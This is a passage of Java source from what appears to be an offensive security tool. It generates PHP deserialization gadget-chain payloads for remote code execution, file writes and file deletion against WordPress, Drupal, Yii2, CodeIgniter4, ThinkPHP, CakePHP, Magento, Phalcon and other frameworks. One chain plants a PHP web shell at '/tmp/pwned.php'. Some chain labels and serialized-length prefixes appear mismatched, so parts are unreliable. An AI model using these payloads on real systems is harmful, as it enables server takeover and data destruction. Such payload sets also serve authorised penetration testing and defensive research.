                "s:10:\"stylesheet\";" + s(cmd) +
                "s:5:\"theme\";" + hooks + "}";
    }

    /**
     * WordPress/RCE2 — WP_HTML_Token __destruct
     * WordPress 6.4.0–6.4.1 (simple, highly reliable)
     */
    private static String wordpressRce2(String fn, String cmd) {
        return "O:14:\"WP_HTML_Token\":2:{" +
                "s:13:\"bookmark_name\";" + s(cmd) +
                "s:10:\"on_destroy\";" + s(fn) + "}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  DOCTRINE CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Doctrine/RCE1 — CacheAdapter __destruct → file include
     * Doctrine 1.5.1–2.7.2
     */
    private static String doctrineRce1(String fn, String cmd) {
        return "O:52:\"Symfony\\Component\\Cache\\Adapter\\Psr16Adapter\":2:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "deferred") +
                ";a:1:{" + sNoSemi("x") + ";O:45:\"Symfony\\Component\\Cache\\CacheItem\":1:{" +
                privKey("Symfony\\Component\\Cache\\CacheItem", "innerItem") +
                ";" + s("<?php " + fn + "('" + cmd + "'); ?>") + "}}" +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "mergeByLifetime") +
                ";" + s(fn) + "}";
    }

    /**
     * Doctrine/RCE2 — CacheAdapter + RedisProxy __destruct
     * Doctrine 1.11.0–2.3.2
     */
    private static String doctrineRce2(String fn, String cmd) {
        return "O:56:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{" +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "mergeByLifetime") +
                ";" + s(fn) +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "namespace") +
                ";" + s("") +
                privKey("Symfony\\Component\\Cache\\Adapter\\AbstractAdapter", "deferred") +
                ";a:1:{i:0;" + s(cmd) + "}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  CODEIGNITER4 CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * CodeIgniter4/RCE1 — RedisHandler __destruct
     * CI4 4.0.2–4.0.3
     * RedisHandler.__destruct → close → redis->close triggers call
     */
    private static String codeIgniter4Rce1(String cmd) {
        return "O:48:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":2:{" +
                protKey("redis") + ";O:48:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{" +
                protKey("redis") + ";N;}" +
                protKey("prefix") + ";" + s(cmd) + "}";
    }

    /**
     * CodeIgniter4/RCE2 — RedisHandler __destruct variant
     * CI4 4.0.0-rc.4–4.3.6
     */
    private static String codeIgniter4Rce2(String cmd) {
        return "O:48:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":3:{" +
                protKey("redis") + ";i:1;" +
                protKey("prefix") + ";" + s("") +
                "s:4:\"path\";" + s(cmd) + "}";
    }

    /**
     * CodeIgniter4/RCE3 — RedisHandler __destruct variant
     * CI4 4.0.4–4.4.3
     */
    private static String codeIgniter4Rce3(String cmd) {
        return "O:48:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":3:{" +
                protKey("redis") + ";i:1;" +
                protKey("prefix") + ";" + s("x") +
                protKey("config") + ";a:1:{" + sNoSemi("prefix") + ";" + s(cmd) + "}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  THINKPHP CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * ThinkPHP/RCE1 — Pivot + Windows pipes __destruct
     * ThinkPHP 5.1.x–5.2.x
     */
    private static String thinkPhpRce1(String fn, String cmd) {
        return "O:27:\"think\\process\\pipes\\Windows\":1:{" +
                privKey("think\\process\\pipes\\Windows", "files") +
                ";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{" +
                protKey("append") + ";a:1:{" + sNoSemi("smi1e") + ";a:1:{i:0;" + s("getError") + "}}" +
                protKey("error") + ";O:27:\"think\\model\\relation\\HasOne\":1:{" +
                protKey("query") + ";O:14:\"think\\db\\Query\":1:{" +
                protKey("model") + ";O:20:\"think\\console\\Output\":1:{" +
                "s:9:\"\\0*\\0styles\";" +
                "a:1:{" + sNoSemi("getAttr") + ";" + s(fn) + "}}}}}}}";
    }

    /**
     * ThinkPHP/RCE2 — Windows pipes __destruct
     * ThinkPHP 5.0.24
     */
    private static String thinkPhpRce2(String cmd) {
        return "O:27:\"think\\process\\pipes\\Windows\":1:{" +
                privKey("think\\process\\pipes\\Windows", "files") +
                ";a:1:{i:0;" + s(cmd) + "}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  YII CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Yii2/RCE1 — BatchQueryResult __destruct (CVE-2020-15148)
     * Yii2 <2.0.38
     */
    private static String yii2Rce1(String fn, String cmd) {
        return "O:23:\"yii\\db\\BatchQueryResult\":1:{" +
                privKey("yii\\db\\BatchQueryResult", "_dataReader") +
                ";O:17:\"yii\\db\\Connection\":1:{" +
                "s:3:\"pdo\";" +
                "O:22:\"yii\\caching\\ArrayCache\":1:{" +
                "s:14:\"serializer\";a:2:{i:0;" + s(fn) + "i:1;" + s(cmd) + "}}}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  CAKEPHP CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * CakePHP/RCE1 — Symfony\Process __destruct → command exec
     * CakePHP ≤3.9.6 (bundles Symfony Process)
     */
    private static String cakePhpRce1(String cmd) {
        return "O:37:\"Symfony\\Component\\Process\\Process\":4:{" +
                privKey("Symfony\\Component\\Process\\Process", "commandline") + ";" + s(cmd) +
                privKey("Symfony\\Component\\Process\\Process", "status") + ";" + s("started") +
                privKey("Symfony\\Component\\Process\\Process", "processPipes") +
                ";O:50:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{" +
                privKey("Symfony\\Component\\Process\\Pipes\\WindowsPipes", "files") + ";a:0:{}}" +
                privKey("Symfony\\Component\\Process\\Process", "exitcode") + ";i:-1;}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  DRUPAL CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Drupal7/RCE1 — SchemaCache __destruct
     * Drupal 7.0.8–7.98
     */
    private static String drupal7Rce1(String fn, String cmd) {
        return "O:11:\"SchemaCache\":1:{" +
                protKey("bin") + ";O:22:\"DrupalDatabaseCache\":2:{" +
                protKey("bin") + ";" + s("cache") +
                protKey("drushExtras") + ";a:2:{" +
                sNoSemi("callbacks") + ";a:1:{i:0;" + s(fn) + "}" +
                sNoSemi("args") + ";a:1:{i:0;" + s(cmd) + "}}}}";
    }

    /**
     * Drupal/RCE1 — FileCookieJar + Container __destruct
     * Drupal 8.9.6–9.5.10+
     * Uses Guzzle FileCookieJar as entry, chains through Drupal Container
     */
    private static String drupalRce1(String cmd) {
        return "O:36:\"GuzzleHttp\\Cookie\\FileCookieJar\":3:{" +
                privKey("GuzzleHttp\\Cookie\\FileCookieJar", "filename") + ";" + s("/tmp/pwned.php") +
                privKey("GuzzleHttp\\Cookie\\FileCookieJar", "storeSessionCookies") + ";b:1;" +
                privKey("GuzzleHttp\\Cookie\\CookieJar", "cookies") +
                ";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{" +
                privKey("GuzzleHttp\\Cookie\\SetCookie", "data") +
                ";a:3:{" + sNoSemi("Expires") + ";i:1;" +
                sNoSemi("Discard") + ";b:0;" +
                sNoSemi("Value") + ";" + s("<?php system('" + cmd + "'); ?>") + "}}}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  ZENDFRAMEWORK CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * ZendFramework/RCE3 — Zend\Log\Logger __destruct
     * Zend 2.0.1–?
     */
    private static String zendRce3(String fn, String cmd) {
        return "O:20:\"Zend\\Log\\Logger\":1:{" +
                protKey("writers") + ";O:25:\"Zend\\Stdlib\\SplPriorityQueue\":1:{" +
                protKey("queue") + ";a:1:{i:0;a:2:{" +
                sNoSemi("data") + ";a:2:{" +
                sNoSemi("shutdown") + ";a:2:{i:0;" + s(fn) + "i:1;" + s(cmd) + "}" +
                sNoSemi("write") + ";" + s(fn) + "}" +
                sNoSemi("priority") + ";i:1;}}}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  SLIM CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Slim/RCE1 — Slim\Http\Response __toString
     * Slim 3.8.1
     */
    private static String slimRce1(String fn, String cmd) {
        return "O:22:\"Slim\\Http\\Response\":2:{" +
                protKey("body") + ";O:25:\"GuzzleHttp\\Psr7\\Stream\":2:{" +
                privKey("GuzzleHttp\\Psr7\\Stream", "stream") + ";" + s(cmd) +
                privKey("GuzzleHttp\\Psr7\\Stream", "customMetadata") +
                ";a:1:{" + sNoSemi("read") + ";" + s(fn) + "}}" +
                protKey("headers") + ";a:0:{}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  MAGENTO CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Magento/FW1 — Zend_Memory_Manager __destruct → file write
     * Magento ≤1.9.4.0
     * Command param is used as the path for the file write
     */
    private static String magentoFw1(String cmd) {
        return "O:19:\"Zend_Memory_Manager\":2:{" +
                privKey("Zend_Memory_Manager", "_backend") +
                ";O:23:\"Zend_Cache_Backend_File\":1:{" +
                privKey("Zend_Cache_Backend_File", "_options") +
                ";a:1:{" + sNoSemi("cache_dir") + ";" + s(cmd) + "}}" +
                privKey("Zend_Memory_Manager", "_lastModified") + ";i:1;}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  PHALCON CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * Phalcon/RCE1 — Logger\Adapter\File __wakeup → eval php://input
     * Phalcon ≤1.2.2
     * No command param needed — reads POST data via php://input
     * Command param used as file path for the logger
     */
    private static String phalconRce1(String cmd) {
        return "O:32:\"Phalcon\\Logger\\Adapter\\File\":2:{" +
                protKey("_path") + ";" + s("php://filter/write=convert.base64-decode/resource=" + cmd) +
                protKey("_options") + ";a:0:{}}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  SWIFTMAILER CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /**
     * SwiftMailer/FD1 — TemporaryFileByteStream __destruct → file delete
     * SwiftMailer 5.4.12+, 6.2.1+
     * __destruct calls unlink($this->path)
     * Command param = file path to delete
     */
    private static String swiftmailerFd1(String cmd) {
        return "O:49:\"Swift_ByteStream_TemporaryFileByteStream\":1:{" +
                privKey("Swift_ByteStream_FileByteStream", "_path") + ";" + s(cmd) + "}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  GENERIC CHAINS
     * ════════════════════════════════════════════════════════════════════════ */

    /** Generic __destruct / __wakeup → function call */
    private static String genericDestruct(String fn, String cmd) {
        return "O:11:\"OmniStrike\":2:{" +
                "s:4:\"func\";" + s(fn) +
                "s:4:\"args\";" + s(cmd) + "}";
    }

    /** Generic __toString → call_user_func */
    private static String genericToString(String fn, String cmd) {
        return "a:1:{i:0;O:11:\"OmniStrike\":2:{" +
                "s:8:\"callback\";" + s(fn) +
                "s:9:\"parameter\";" + s(cmd) + "}}";
    }
}
